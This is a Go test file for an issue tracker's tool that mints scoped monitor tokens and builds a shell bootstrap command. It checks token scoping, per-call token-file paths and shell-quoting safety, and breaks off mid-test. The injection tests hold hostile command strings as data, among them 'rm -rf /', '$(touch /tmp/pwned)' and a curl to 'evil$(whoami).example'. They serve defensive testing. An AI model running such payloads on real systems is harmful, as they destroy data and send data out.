package tools

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/jackc/pgx/v5/pgxpool"
	mcpgo "github.com/mark3labs/mcp-go/mcp"

	"skein-api/internal/auth"
	"skein-api/internal/handler"
	"skein-api/internal/monitorcreds"
	"skein-api/internal/notifications"
)

const gmsTestPublicURL = "https://skein.example"

// seedAPIKeyForTool inserts an active api_keys row owned by userID and returns
// its id. The skein_get_monitor_script mint path stamps minted_by_api_key_id
// = this id (FK → api_keys ON DELETE CASCADE), so withCtx's random key id
// would trip the FK — the credential must point at a real key.
func seedAPIKeyForTool(t *testing.T, pool *pgxpool.Pool, userID uuid.UUID) uuid.UUID {
	t.Helper()
	id := uuid.Must(uuid.NewRandom())
	prefix := "ska_" + strings.ReplaceAll(id.String()[:12], "-", "")
	_, err := pool.Exec(context.Background(), `
INSERT INTO api_keys (id, user_id, key_hash, prefix, label, created_at)
VALUES ($1, $2, 'fake-hash-for-test', $3, 'gms test', now())`, id, userID, prefix)
	if err != nil {
		t.Fatalf("seed api key: %v", err)
	}
	// Registered last (after user + project) → runs first in LIFO cleanup, so
	// the CASCADE drops any minted monitor_credentials before user/project go.
	t.Cleanup(func() {
		_, _ = pool.Exec(context.Background(), `DELETE FROM api_keys WHERE id = $1`, id)
	})
	return id
}

// withCtxKey mirrors withCtx but stamps a SPECIFIC api key id (a real row) so
// the mint FK is satisfied. The empty keyID case exercises the no-api-key door.
func withCtxKey(userID uuid.UUID, role string, keyID uuid.UUID) context.Context {
	ctx := context.Background()
	ctx = auth.WithUserID(ctx, userID)
	ctx = auth.WithUserRole(ctx, role)
	ctx = auth.WithSessionID(ctx, "test-session-"+userID.String()[:8])
	if keyID != uuid.Nil {
		ctx = auth.WithAPIKeyID(ctx, keyID)
	}
	return ctx
}

type gmsCredRow struct {
	userID       uuid.UUID
	apiKeyID     uuid.UUID
	audience     string
	capability   string
	projectID    uuid.UUID
	scopeIssueID string
	scopeSubtree bool
	eventTypes   []string
}

// readCredByToken reads the persisted monitor_credentials row for a plaintext
// token (by its SHA-256 digest), or fails if absent.
func readCredByToken(t *testing.T, pool *pgxpool.Pool, plaintext string) gmsCredRow {
	t.Helper()
	digest := sha256.Sum256([]byte(plaintext))
	var r gmsCredRow
	err := pool.QueryRow(context.Background(), `
SELECT user_id, minted_by_api_key_id, audience, capability,
       project_id, scope_issue_id, scope_subtree, event_types
  FROM monitor_credentials WHERE token_digest = $1`, digest[:]).Scan(
		&r.userID, &r.apiKeyID, &r.audience, &r.capability,
		&r.projectID, &r.scopeIssueID, &r.scopeSubtree, &r.eventTypes)
	if err != nil {
		t.Fatalf("read credential by token: %v", err)
	}
	return r
}

func readWatcherScope(t *testing.T, pool *pgxpool.Pool, issueID string, userID uuid.UUID) (string, bool) {
	t.Helper()
	var scope string
	err := pool.QueryRow(context.Background(),
		`SELECT scope FROM issue_watchers WHERE issue_id = $1 AND user_id = $2`,
		issueID, userID).Scan(&scope)
	if err != nil {
		return "", false
	}
	return scope, true
}

// TestGetMonitorScript_HappyPath: the tool mints an skm_ token, the bootstrap
// never contains the token literal, the persisted credential carries the
// scope/types/audience from the args, and the auto-watch row is created with
// issue scope (subtree=false).
func TestGetMonitorScript_HappyPath(t *testing.T) {
	pool := newTestPool(t)
	userID, _ := seedUser(t, pool, "user")
	pid, prefix := seedProject(t, pool, userID, "gms")
	issueID := prefix + "-1"
	seedIssue(t, pool, pid, userID, issueID, "monitor me", "open", 2)
	keyID := seedAPIKeyForTool(t, pool, userID)

	notifStore := notifications.NewStore(pool)
	monitorStore := monitorcreds.New(pool, 6*time.Hour)
	handler := handleGetMonitorScript(pool, notifStore, monitorStore, gmsTestPublicURL)
	ctx := withCtxKey(userID, "user", keyID)

	req := mcpgo.CallToolRequest{}
	req.Params.Arguments = map[string]any{"id": issueID}
	res, err := handler(ctx, req)
	if err != nil {
		t.Fatalf("handler error: %v", err)
	}
	if res.IsError {
		t.Fatalf("unexpected isError=true: %s", extractToolJSON(t, res))
	}
	body := extractToolJSON(t, res)

	token, _ := body["token"].(string)
	if !strings.HasPrefix(token, monitorcreds.TokenTag) {
		t.Fatalf("token %q missing %q prefix", token, monitorcreds.TokenTag)
	}
	bootstrap, _ := body["bootstrap"].(string)
	if bootstrap == "" {
		t.Fatalf("missing bootstrap")
	}
	if strings.Contains(bootstrap, token) {
		t.Fatalf("bootstrap leaked the token literal:\n%s", bootstrap)
	}
	// The bootstrap references the token FILE, runs python3, and never curls.
	if !strings.Contains(bootstrap, "SKEIN_TOKEN_FILE=") || !strings.Contains(bootstrap, "python3 -c") {
		t.Fatalf("bootstrap shape unexpected:\n%s", bootstrap)
	}
	// The runner-fetch must carry a timeout so a hung connection cannot block
	// the bootstrap forever before the runner starts (Finding 2).
	if !strings.Contains(bootstrap, "timeout=") {
		t.Fatalf("bootstrap loader missing urlopen timeout:\n%s", bootstrap)
	}
	// sk-164 FR-2 (T085/F3): the mint bakes the caller's CURRENT MCP session into
	// SKEIN_EXCLUDE_SESSION so the detached runner sends it as the exclude_session
	// rebind on the first poll (server best-effort echo suppression). withCtxKey
	// stamps session "test-session-<userID[:8]>"; it must be baked, single-quoted.
	wantSess := "test-session-" + userID.String()[:8]
	if !strings.Contains(bootstrap, "SKEIN_EXCLUDE_SESSION="+shellSingleQuote(wantSess)+" ") {
		t.Fatalf("bootstrap must bake SKEIN_EXCLUDE_SESSION=%q from the caller session:\n%s", wantSess, bootstrap)
	}
	// Finding 1: the tokenFilePath response field MUST be byte-identical to the
	// path the bootstrap embeds, AND a concrete literal /tmp/... path (no shell
	// expansion), because the agent writes the token with the Write tool, which
	// does NOT expand ${XDG_RUNTIME_DIR:-/tmp}. A mismatch was the bug.
	// sk-239: the path is /tmp/skein-mon-<id>-<random hex>.token — per minted
	// credential, not per issue (see TestGetMonitorScript_TokenFilePathIsPerCall).
	tokenFilePath, _ := body["tokenFilePath"].(string)
	wantPrefix := "/tmp/skein-mon-" + issueID + "-"
	if !strings.HasPrefix(tokenFilePath, wantPrefix) || !strings.HasSuffix(tokenFilePath, ".token") {
		t.Fatalf("tokenFilePath = %q, want literal %q<hex>.token", tokenFilePath, wantPrefix)
	}
	// Literal path: no shell parameter expansion the Write tool cannot resolve.
	if strings.ContainsAny(tokenFilePath, "$}{") {
		t.Fatalf("tokenFilePath %q must be a concrete literal (no shell expansion)", tokenFilePath)
	}
	if !strings.Contains(bootstrap, "SKEIN_TOKEN_FILE="+shellSingleQuote(tokenFilePath)+" ") {
		t.Fatalf("bootstrap SKEIN_TOKEN_FILE does not match tokenFilePath %q:\n%s", tokenFilePath, bootstrap)
	}
	// Default (no eventTypes passed) = comment.created + issue.closed (sk-157),
	// so a paired/following agent learns the task finished, not just commented.
	if eventTypes, _ := body["eventTypes"].([]any); len(eventTypes) != 2 ||
		eventTypes[0] != "comment.created" || eventTypes[1] != "issue.closed" {
		t.Fatalf("eventTypes = %v, want [comment.created issue.closed]", body["eventTypes"])
	}

	// Persisted credential carries the right scope/types/owner.
	cred := readCredByToken(t, pool, token)
	if cred.userID != userID {
		t.Fatalf("cred.user_id = %s, want %s", cred.userID, userID)
	}
	if cred.apiKeyID != keyID {
		t.Fatalf("cred.minted_by_api_key_id = %s, want %s", cred.apiKeyID, keyID)
	}
	if cred.audience != "notifications:poll" {
		t.Fatalf("cred.audience = %q, want notifications:poll", cred.audience)
	}
	if cred.capability != "read" {
		t.Fatalf("cred.capability = %q, want read", cred.capability)
	}
	if cred.projectID != pid {
		t.Fatalf("cred.project_id = %s, want %s", cred.projectID, pid)
	}
	if cred.scopeIssueID != issueID {
		t.Fatalf("cred.scope_issue_id = %q, want %q", cred.scopeIssueID, issueID)
	}
	if cred.scopeSubtree {
		t.Fatalf("cred.scope_subtree = true, want false")
	}
	if len(cred.eventTypes) != 2 || cred.eventTypes[0] != "comment.created" || cred.eventTypes[1] != "issue.closed" {
		t.Fatalf("cred.event_types = %v, want [comment.created issue.closed]", cred.eventTypes)
	}

	// Auto-watch row created with issue scope.
	scope, ok := readWatcherScope(t, pool, issueID, userID)
	if !ok {
		t.Fatalf("no issue_watchers row created")
	}
	if scope != notifications.ScopeIssue {
		t.Fatalf("watcher scope = %q, want %q", scope, notifications.ScopeIssue)
	}
}

// TestGetMonitorScript_ResponseNamesTheMonitor — sk-579 matrix row 22 (US-6,
// R10, US-4 usage): monitorId is the id of the credential row the token
// belongs to; the row stores the calling session verbatim (an absent session
// as ”, never NULL) and the tokenFilePath of the response; usage tells the
// agent how to run and restart the same bootstrap.
func TestGetMonitorScript_ResponseNamesTheMonitor(t *testing.T) {
	pool := newTestPool(t)
	userID, _ := seedUser(t, pool, "user")
	pid, prefix := seedProject(t, pool, userID, "gmr")
	issueID := prefix + "-1"
	seedIssue(t, pool, pid, userID, issueID, "monitor me", "open", 2)
	keyID := seedAPIKeyForTool(t, pool, userID)
	handler := handleGetMonitorScript(pool, notifications.NewStore(pool), monitorcreds.New(pool, 6*time.Hour), gmsTestPublicURL)

	sessionless := auth.WithAPIKeyID(auth.WithUserRole(auth.WithUserID(context.Background(), userID), "user"), keyID)
	cases := []struct {
		name        string
		ctx         context.Context
		wantSession string
	}{
		{"with a session", withCtxKey(userID, "user", keyID), "test-session-" + userID.String()[:8]},
		{"without a session", sessionless, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := mcpgo.CallToolRequest{}
			req.Params.Arguments = map[string]any{"id": issueID}
			res, err := handler(tc.ctx, req)
			if err != nil || res.IsError {
				t.Fatalf("handler: err=%v isError=%v", err, res != nil && res.IsError)
			}
			body := extractToolJSON(t, res)
			token, _ := body["token"].(string)
			digest := sha256.Sum256([]byte(token))
			var (
				id      uuid.UUID
				session *string
				path    *string
			)
			if err := pool.QueryRow(context.Background(), `
SELECT id, issued_session_id, token_file_path FROM monitor_credentials WHERE token_digest = $1`,
				digest[:]).Scan(&id, &session, &path); err != nil {
				t.Fatalf("read credential: %v", err)
			}
			if body["monitorId"] != id.String() {
				t.Errorf("monitorId = %v, want the credential id %s", body["monitorId"], id)
			}
			if session == nil {
				t.Errorf("issued_session_id is NULL, want %q", tc.wantSession)
			} else if *session != tc.wantSession {
				t.Errorf("issued_session_id = %q, want %q", *session, tc.wantSession)
			}
			if path == nil || *path != body["tokenFilePath"] {
				t.Errorf("token_file_path = %v, want tokenFilePath %v", path, body["tokenFilePath"])
			}
			usage, _ := body["usage"].(string)
			for _, name := range []string{"timeout_ms", "bootstrap"} {
				if !strings.Contains(usage, name) {
					t.Errorf("usage does not name %s: %q", name, usage)
				}
			}
		})
	}
}

// TestGetMonitorScript_Subtree: subtree=true → credential scope_subtree true
// AND watcher scope 'subtree'.
func TestGetMonitorScript_Subtree(t *testing.T) {
	pool := newTestPool(t)
	userID, _ := seedUser(t, pool, "user")
	pid, prefix := seedProject(t, pool, userID, "gmss")
	issueID := prefix + "-1"
	seedIssue(t, pool, pid, userID, issueID, "monitor subtree", "open", 2)
	keyID := seedAPIKeyForTool(t, pool, userID)

	handler := handleGetMonitorScript(pool, notifications.NewStore(pool), monitorcreds.New(pool, 6*time.Hour), gmsTestPublicURL)
	ctx := withCtxKey(userID, "user", keyID)

	req := mcpgo.CallToolRequest{}
	req.Params.Arguments = map[string]any{
		"id":         issueID,
		"subtree":    true,
		"eventTypes": []any{"comment.created", "issue.status_changed"},
	}
	res, err := handler(ctx, req)
	if err != nil || res.IsError {
		t.Fatalf("subtree call failed: err=%v body=%s", err, extractToolJSON(t, res))
	}
	body := extractToolJSON(t, res)
	token, _ := body["token"].(string)

	cred := readCredByToken(t, pool, token)
	if !cred.scopeSubtree {
		t.Fatalf("cred.scope_subtree = false, want true")
	}
	if len(cred.eventTypes) != 2 || cred.eventTypes[0] != "comment.created" || cred.eventTypes[1] != "issue.status_changed" {
		t.Fatalf("cred.event_types = %v, want [comment.created issue.status_changed]", cred.eventTypes)
	}
	scope, ok := readWatcherScope(t, pool, issueID, userID)
	if !ok || scope != notifications.ScopeSubtree {
		t.Fatalf("watcher scope = %q ok=%v, want %q", scope, ok, notifications.ScopeSubtree)
	}
}

// TestGetMonitorScript_RejectsBadEventType: a type the poll endpoint can't
// normalise (attachment.added) is rejected, and NOTHING is minted/watched.
func TestGetMonitorScript_RejectsBadEventType(t *testing.T) {
	pool := newTestPool(t)
	userID, _ := seedUser(t, pool, "user")
	pid, prefix := seedProject(t, pool, userID, "gmsb")
	issueID := prefix + "-1"
	seedIssue(t, pool, pid, userID, issueID, "bad type", "open", 2)
	keyID := seedAPIKeyForTool(t, pool, userID)

	handler := handleGetMonitorScript(pool, notifications.NewStore(pool), monitorcreds.New(pool, 6*time.Hour), gmsTestPublicURL)
	ctx := withCtxKey(userID, "user", keyID)

	req := mcpgo.CallToolRequest{}
	req.Params.Arguments = map[string]any{
		"id":         issueID,
		"eventTypes": []any{"attachment.added"},
	}
	res, err := handler(ctx, req)
	if err != nil {
		t.Fatalf("handler error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("expected isError=true for attachment.added")
	}
	body := extractToolJSON(t, res)
	if body["error"] != ErrCodeValidationError {
		t.Fatalf("error = %v, want %q", body["error"], ErrCodeValidationError)
	}
	// No watcher row, no credential should exist.
	if _, ok := readWatcherScope(t, pool, issueID, userID); ok {
		t.Fatalf("watcher row created despite validation error")
	}
	var n int
	if err := pool.QueryRow(context.Background(),
		`SELECT count(*) FROM monitor_credentials WHERE scope_issue_id = $1`, issueID).Scan(&n); err != nil {
		t.Fatalf("count creds: %v", err)
	}
	if n != 0 {
		t.Fatalf("minted %d credentials despite validation error", n)
	}
}

// TestGetMonitorScript_MissingAPIKey: no api key id in context → stable
// api_key_required error, nothing minted.
func TestGetMonitorScript_MissingAPIKey(t *testing.T) {
	pool := newTestPool(t)
	userID, _ := seedUser(t, pool, "user")
	pid, prefix := seedProject(t, pool, userID, "gmsk")
	issueID := prefix + "-1"
	seedIssue(t, pool, pid, userID, issueID, "no key", "open", 2)

	handler := handleGetMonitorScript(pool, notifications.NewStore(pool), monitorcreds.New(pool, 6*time.Hour), gmsTestPublicURL)
	ctx := withCtxKey(userID, "user", uuid.Nil) // no api key id

	req := mcpgo.CallToolRequest{}
	req.Params.Arguments = map[string]any{"id": issueID}
	res, err := handler(ctx, req)
	if err != nil {
		t.Fatalf("handler error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("expected isError=true with no api key id")
	}
	body := extractToolJSON(t, res)
	if body["error"] != ErrCodeAPIKeyRequired {
		t.Fatalf("error = %v, want %q", body["error"], ErrCodeAPIKeyRequired)
	}
}

// TestNormalizeMonitorEventTypes is a pure unit test (no DB).
func TestNormalizeMonitorEventTypes(t *testing.T) {
	cases := []struct {
		name string
		in   []string
		want []string
		ok   bool
	}{
		{name: "nil defaults", in: nil, want: []string{"comment.created", "issue.closed"}, ok: true},
		{name: "empty defaults", in: []string{}, want: []string{"comment.created", "issue.closed"}, ok: true},
		{name: "comment ok (explicit overrides default)", in: []string{"comment.created"}, want: []string{"comment.created"}, ok: true},
		{name: "issue.closed explicit ok", in: []string{"issue.closed"}, want: []string{"issue.closed"}, ok: true},
		{name: "issue prefix ok", in: []string{"issue.status_changed", "issue.reparented"}, want: []string{"issue.status_changed", "issue.reparented"}, ok: true},
		{name: "trims", in: []string{"  comment.created  "}, want: []string{"comment.created"}, ok: true},
		{name: "attachment rejected", in: []string{"attachment.added"}, ok: false},
		{name: "blank entry rejected", in: []string{"comment.created", "  "}, ok: false},
		{name: "unknown rejected", in: []string{"comment.deleted"}, ok: false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := normalizeMonitorEventTypes(tc.in)
			if ok != tc.ok {
				t.Fatalf("ok = %v, want %v", ok, tc.ok)
			}
			if !tc.ok {
				return
			}
			if strings.Join(got, ",") != strings.Join(tc.want, ",") {
				t.Fatalf("got %v, want %v", got, tc.want)
			}
		})
	}
}

// TestMonitorTokenFilePath_UniquePerCall (sk-239) is the regression guard for
// the collision: the token-file path used to be derived from the issue id
// ALONE, so every agent monitoring the same channel was pointed at one shared
// file. Two agents per channel is the normal multi-agent shape (several
// agents per task), so the collision was guaranteed on every task, and the
// runner deletes SKEIN_TOKEN_FILE on exit — one runner's exit unlinked the
// other's freshly-written token.
//
// The invariant: two mints for the SAME issue must never share a path.
func TestMonitorTokenFilePath_UniquePerCall(t *testing.T) {
	const issueID = "acm-351.1"

	seen := make(map[string]struct{}, 64)
	for range 64 {
		d, err := newMonitorTokenDiscriminator()
		if err != nil {
			t.Fatalf("discriminator: %v", err)
		}
		p := monitorTokenFilePath(issueID, d)

		if _, dup := seen[p]; dup {
			t.Fatalf("path %q handed out twice — collision is the bug", p)
		}
		seen[p] = struct{}{}

		// Still a concrete literal under /tmp, still issue-scoped for humans
		// eyeballing /tmp during a run.
		if !strings.HasPrefix(p, "/tmp/skein-mon-"+issueID+"-") || !strings.HasSuffix(p, ".token") {
			t.Fatalf("path %q lost its literal /tmp/skein-mon-<id>-<hex>.token shape", p)
		}
		// The discriminator must be hex: it lands in a filesystem path AND in
		// the runner's os.remove() target, so it can never carry a separator or
		// a traversal segment.
		if len(d) != monitorTokenDiscriminatorBytes*2 {
			t.Fatalf("discriminator %q length %d, want %d hex chars", d, len(d), monitorTokenDiscriminatorBytes*2)
		}
		if strings.Trim(d, "0123456789abcdef") != "" {
			t.Fatalf("discriminator %q is not lowercase hex — path-unsafe", d)
		}
	}
}

// TestGetMonitorScript_BootstrapUsesSuppliedPath (sk-239) pins the trap in the
// fix itself: the builder must EMBED the path it is handed, never recompute it.
// A recomputed random suffix would differ from the tokenFilePath returned to
// the agent, so the agent would Write to one path and the runner would read
// another — the "token file missing or empty" failure the literal-path rule
// already exists to prevent.
func TestGetMonitorScript_BootstrapUsesSuppliedPath(t *testing.T) {
	const issueID = "sk-42"

	// Two distinct paths for one issue: whichever is passed must be the one
	// embedded. If the builder recomputed internally, one of these would fail.
	for _, want := range []string{
		monitorTokenFilePath(issueID, "aaaaaaaaaaaaaaaa"),
		monitorTokenFilePath(issueID, "bbbbbbbbbbbbbbbb"),
	} {
		b := buildMonitorBootstrap("https://skein.example", issueID, "mcp-session-1d7a", want)
		if !strings.Contains(b, " SKEIN_TOKEN_FILE="+shellSingleQuote(want)+" ") {
			t.Fatalf("bootstrap must embed the supplied token path %q:\n%s", want, b)
		}
	}
}

// TestShellSingleQuote_RoundTrips proves the quoting helper is injection-safe:
// for each hostile input, `sh -c 'printf %s '+quoted` must print exactly the
// original bytes (no expansion, no breakout). If sh is unavailable the test
// skips.
func TestShellSingleQuote_RoundTrips(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("sh not available")
	}
	inputs := []string{
		"plain",
		"with space",
		"with'quote",
		"$(touch /tmp/pwned)",
		"`id`",
		"a';rm -rf /;'b",
		`back\slash`,
		"a\"b",
		"sk-42",
		"sk-1';curl evil$(whoami).example/",
	}
	for _, in := range inputs {
		quoted := shellSingleQuote(in)
		out, err := exec.Command("sh", "-c", "printf %s "+quoted).Output()
		if err != nil {
			t.Fatalf("sh failed for %q (quoted=%s): %v", in, quoted, err)
		}
		if string(out) != in {
			t.Fatalf("round-trip mismatch: in=%q quoted=%s out=%q", in, quoted, string(out))
		}
	}
}

// TestBuildMonitorBootstrap_HostileInputs: a hostile public URL / issue id is
// fully neutralised in the bootstrap (kept inside single quotes), the token
// is never present, and the whole thing round-trips through sh into the
// expected env values.
func TestBuildMonitorBootstrap_HostileInputs(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "pwned")
	hostileURL := "https://h.example/$(touch " + marker + ")' ; rm -rf / ; '"
	hostileID := "sk-1';touch " + marker + ";'"

	hostileTokenFile := monitorTokenFilePath(hostileID, "0badc0de0badc0de")
	b := buildMonitorBootstrap(hostileURL, hostileID, "", hostileTokenFile)

	// sk-164 FR-2: the rebind env var is always present (empty here → '').
	if !strings.Contains(b, "SKEIN_EXCLUDE_SESSION='") {
		t.Fatalf("bootstrap missing SKEIN_EXCLUDE_SESSION:\n%s", b)
	}

	// Token can never appear (the builder takes no token), but assert the
	// dangerous raw payloads are not present UNQUOTED. The simplest robust
	// check: the single-quote-escaped form of each appears, and sh parses
	// the assignments back to the originals.
	if !strings.HasPrefix(b, "SKEIN_PUBLIC_URL='") {
		t.Fatalf("bootstrap does not start with quoted URL:\n%s", b)
	}
	// The raw "$(touch" must always sit inside single quotes — it appears in
	// the input, so it appears in the string, but never as a live command
	// substitution. We verify via sh round-trip below.
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("sh not available for round-trip verification")
	}
	// Evaluate the bootstrap's env assignments without running python3:
	// replace the python3 invocation with a printf that echoes the env vars.
	// We reconstruct just the assignments + a safe command.
	assignments := strings.TrimSuffix(b, " python3 -c "+shellSingleQuote(monitorLoader()))
	// The VAR=val prefix exports into the CHILD process environment; a builtin
	// printf in the same shell would not see it via $VAR expansion, so run a
	// child `sh -c` that reads the vars from its inherited environment.
	script := assignments + ` sh -c 'printf "%s\n%s\n%s" "$SKEIN_PUBLIC_URL" "$SKEIN_ISSUE" "$SKEIN_TOKEN_FILE"'`
	out, err := exec.Command("sh", "-c", script).Output()
	if err != nil {
		t.Fatalf("sh eval failed: %v\nscript=%s", err, script)
	}
	lines := strings.SplitN(string(out), "\n", 3)
	if len(lines) != 3 {
		t.Fatalf("expected 3 lines, got %q", string(out))
	}
	if lines[0] != hostileURL {
		t.Fatalf("SKEIN_PUBLIC_URL = %q, want %q (injection!)", lines[0], hostileURL)
	}
	if lines[1] != hostileID {
		t.Fatalf("SKEIN_ISSUE = %q, want %q (injection!)", lines[1], hostileID)
	}
	// The token-file path is a concrete literal, fully single-quoted: no shell
	// expansion, the hostile id stays inert. It must round-trip byte-for-byte
	// to the path handed in — that string IS the Write-tool target (sk-239: the
	// builder no longer recomputes it, since the suffix is random per call).
	if lines[2] != hostileTokenFile {
		t.Fatalf("SKEIN_TOKEN_FILE = %q, want literal %q (mismatch was the bug)", lines[2], hostileTokenFile)
	}
	// The marker must NOT have been created (no command substitution fired).
	if _, err := os.Stat(marker); err == nil {
		t.Fatalf("marker %q exists — command substitution fired (injection!)", marker)
	}
}

// TestBuildMonitorBootstrap_BakesSession (sk-164 FR-2 / T085) proves a NON-empty
// current session is baked into SKEIN_EXCLUDE_SESSION single-quoted, and a
// hostile session string cannot break out of the command. Complements the
// empty-session case asserted in TestBuildMonitorBootstrap_HostileInputs.
func TestBuildMonitorBootstrap_BakesSession(t *testing.T) {
	b := buildMonitorBootstrap("https://skein.example", "sk-42", "mcp-session-1d7a",
		monitorTokenFilePath("sk-42", "0badc0de0badc0de"))
	if !strings.Contains(b, "SKEIN_EXCLUDE_SESSION='mcp-session-1d7a' ") {
		t.Fatalf("bootstrap must bake the current session into SKEIN_EXCLUDE_SESSION:\n%s", b)
	}

	// Hostile session stays inert (fully single-quoted). Verify via sh round-trip.
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("sh not available for round-trip verification")
	}
	marker := filepath.Join(t.TempDir(), "pwned")
	hostileSess := "s';touch " + marker + ";'"
	hb := buildMonitorBootstrap("https://skein.example", "sk-42", hostileSess,
		monitorTokenFilePath("sk-42", "0badc0de0badc0de"))
	assignments := strings.TrimSuffix(hb, " python3 -c "+shellSingleQuote(monitorLoader()))
	script := assignments + ` sh -c 'printf "%s" "$SKEIN_EXCLUDE_SESSION"'`
	out, err := exec.Command("sh", "-c", script).Output()
	if err != nil {
		t.Fatalf("sh eval failed: %v\nscript=%s", err, script)
	}
	if string(out) != hostileSess {
		t.Fatalf("SKEIN_EXCLUDE_SESSION = %q, want %q (injection!)", string(out), hostileSess)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatalf("marker %q exists — hostile session fired a command (injection!)", marker)
	}
}

// ---------------------------------------------------------------------------
// Matrix row 24 (sk-579: T006, T010, US-3, US-4 "restart", SC-005, SC-006,
// INV-4) — the REAL bootstrap command from buildMonitorBootstrap, run by
// `sh -c` in its own process group against an httptest server that serves
// the runner rendered by the real handler. It proves the loader survives the
// single quotes, that after exec the runner owns the stop protocol (SIGTERM
// keeps the token file, so the SAME command starts the monitor again), and
// that the body download has a finite positive limit.
//
// Interpreter hooks come from the runner's shared test site
// (internal/handler/testdata/runner_site/sitecustomize.py). Without sh or
// python3 the test is skipped.
// ---------------------------------------------------------------------------

// bootstrapServer serves the monitor-script door and the poll door.
type bootstrapServer struct {
	srv     *httptest.Server
	script  func(w http.ResponseWriter, r *http.Request)
	polled  chan struct{}
	mu      sync.Mutex
	pending []map[string]any
	nextID  int
}

func newBootstrapServer(t *testing.T, runnerBody []byte) *bootstrapServer {
	t.Helper()
	b := &bootstrapServer{polled: make(chan struct{}, 1000), nextID: 500}
	b.script = func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/x-python")
		_, _ = w.Write(runnerBody)
	}
	b.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/agent/v1/monitor-script" {
			b.script(w, r)
			return
		}
		b.mu.Lock()
		notes := b.pending
		b.pending = nil
		b.mu.Unlock()
		if notes == nil {
			notes = []map[string]any{}
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"notifications": notes,
			"cursor":        map[string]any{"ts": "2026-01-01T00:00:00Z", "id": 1},
		})
		select {
		case b.polled <- struct{}{}:
		default:
		}
	}))
	t.Cleanup(b.srv.Close)
	return b
}

func (b *bootstrapServer) push() int {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.nextID++
	b.pending = append(b.pending, map[string]any{"id": b.nextID, "type": "comment.created"})
	return b.nextID
}

// bootRun is one running bootstrap command.
type bootRun struct {
	cmd   *exec.Cmd
	lines chan map[string]any
	all   []map[string]any
	done  chan struct{}
}

func startBootstrap(t *testing.T, command string, extraEnv ...string) *bootRun {
	t.Helper()
	cmd := exec.Command("sh", "-c", command)
	cmd.Env = append(os.Environ(), extraEnv...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatalf("stdout pipe: %v", err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatalf("start bootstrap: %v", err)
	}
	run := &bootRun{cmd: cmd, lines: make(chan map[string]any, 100), done: make(chan struct{})}
	go func() {
		defer close(run.done)
		sc := bufio.NewScanner(stdout)
		for sc.Scan() {
			var obj map[string]any
			if err := json.Unmarshal(sc.Bytes(), &obj); err != nil {
				obj = map[string]any{"__not_json": sc.Text()}
			}
			run.lines <- obj
		}
		close(run.lines)
	}()
	t.Cleanup(func() {
		_ = syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
		_ = cmd.Wait()
	})
	return run
}

// next returns the next stdout line, failing on timeout or end of output.
func (r *bootRun) next(t *testing.T) map[string]any {
	t.Helper()
	select {
	case obj, ok := <-r.lines:
		if !ok {
			t.Fatalf("bootstrap output ended; lines so far: %v", r.all)
		}
		r.all = append(r.all, obj)
		return obj
	case <-time.After(30 * time.Second):
		t.Fatalf("timed out waiting for a bootstrap line; lines so far: %v", r.all)
	}
	return nil
}

// rest drains the remaining output until the command ends.
func (r *bootRun) rest(t *testing.T) []map[string]any {
	t.Helper()
	for {
		select {
		case obj, ok := <-r.lines:
			if !ok {
				return r.all
			}
			r.all = append(r.all, obj)
		case <-time.After(30 * time.Second):
			t.Fatalf("bootstrap did not finish; lines so far: %v", r.all)
		}
	}
}

// assertOneStopLine checks the US-3 machine contract on a finished run.
func assertOneStopLine(t *testing.T, lines []map[string]any, reason, event string) {
	t.Helper()
	var withReason []map[string]any
	for _, l := range lines {
		if _, bad := l["__not_json"]; bad {
			t.Fatalf("non-JSON stdout line: %v", l)
		}
		if _, ok := l["reason"]; ok {
			withReason = append(withReason, l)
		}
	}
	if len(withReason) != 1 {
		t.Fatalf("want exactly one stop line, got %v", lines)
	}
	last := lines[len(lines)-1]
	if last["reason"] != reason || last["event"] != event {
		t.Fatalf("stop line = %v, want reason %s event %s (all: %v)", last, reason, event, lines)
	}
	if a, _ := last["action"].(string); !strings.Contains(a, "zz-24") {
		t.Fatalf("action must name the root issue: %v", last)
	}
}

func TestBootstrapCommand_EndToEnd(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("sh not available")
	}
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 not available")
	}
	site, err := filepath.Abs(filepath.Join("..", "..", "handler", "testdata", "runner_site"))
	if err != nil {
		t.Fatalf("site dir: %v", err)
	}
	rec := httptest.NewRecorder()
	handler.NewAgentScriptHandler(1, 10*time.Second, 15*time.Second, 3*time.Minute).
		Script(rec, httptest.NewRequest(http.MethodGet, "/agent/v1/monitor-script", nil))
	runnerBody := rec.Body.Bytes()

	newToken := func(t *testing.T) string {
		path := filepath.Join(t.TempDir(), "skein-monitor.token")
		if err := os.WriteFile(path, []byte("skm_"+strings.Repeat("f", 43)), 0o600); err != nil {
			t.Fatalf("token: %v", err)
		}
		return path
	}
	fileExists := func(path string) bool {
		_, err := os.Stat(path)
		return err == nil
	}

	t.Run("SIGTERM keeps the file and the same command starts the monitor again", func(t *testing.T) {
		srv := newBootstrapServer(t, runnerBody)
		token := newToken(t)
		command := buildMonitorBootstrap(srv.srv.URL, "zz-24", "sess-24", token)

		first := startBootstrap(t, command)
		if got := first.next(t); got["event"] != "monitor_started" {
			t.Fatalf("first line = %v, want monitor_started", got)
		}
		select {
		case <-srv.polled:
